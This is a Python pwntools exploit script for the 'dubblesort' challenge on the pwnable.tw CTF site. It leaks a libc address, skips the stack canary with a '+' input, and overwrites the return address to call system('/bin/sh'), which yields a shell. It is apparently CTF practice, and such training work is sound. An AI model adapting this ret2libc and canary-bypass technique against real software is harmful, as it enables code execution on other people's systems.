#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2019 vam <jpwan21@gmail.com>
#
# Distributed under terms of the MIT license.

from pwn import *

context.log_level = "debug"
pwn_file="./dubblesort"
elf=ELF(pwn_file)

'''
context.arch='i386'
if context.arch=='i386':
    os.environ['LD_LIBRARY_PATH'] = '/home/vam/glibc/i386'
    libc=ELF("/home/vam/glibc/i386/libc.so.6")
else:
    libc=ELF("./libc.so.6")
'''
os.environ['LD_LIBRARY_PATH'] = '/media/psf/CTF/pwnabletw/dubblesort/'
libc = ELF("./libc.so.6")
if len(sys.argv) == 1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("chall.pwnable.tw",10101)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

def sendnumber(numbers):
    info("length: %16x",len(numbers))
    r.sendlineafter("How many numbers do you what to sort :", str(len(numbers)))
    for x in numbers:
        r.sendlineafter("number : ", x)
    r.recvuntil("Processing......\n")

#name = 'a'*0x1f
name = 'a'*0x18
r.recvuntil("What your name :")

debug()
r.sendline(name)
r.recvuntil(name+'\n')
on_libc  = u32('\x00'+r.recv(3))
#on_pie  = u32(r.recv(4))
info("on_libc: %16x", on_libc)
#info("on_pie: %16x",  on_pie)
#text_start = on_pie - 0x601 
#info("text_start: %16x", text_start)
libc.address = on_libc -(0xf77c4000-0xf7614000)#(0xf7f2df0a-0xf7e0f000)#(0xf77c7000 - 0xf762f000)
info("libc_start: %16x", libc.address)

binsh = list(libc.search('/bin/sh'))[0]
system = libc.sym['system']

#puts = elf.plt['puts'] + text_start
#start  = text_start +  0x710
#numbers = [str(0)]*24 +['+', str(puts),str(puts),str(puts),str(puts),str(puts), str(start) , str(text_start + elf.got['puts'])]
numbers = [str(0)]*24
numbers.extend(['+', str(system),str(system),str(system),str(system),str(system),str(system),str(system),str(system), str(binsh) , str(binsh)])

debug()
sendnumber(numbers)

#w = r.recvuntil("What your name :")
#puts_addr = w[-len("What your name :")-4: -len("What your name :")]
#libc.address = puts_addr - libc.sym['puts']
#info("libc.address: %16x", libc.address)

r.interactive()
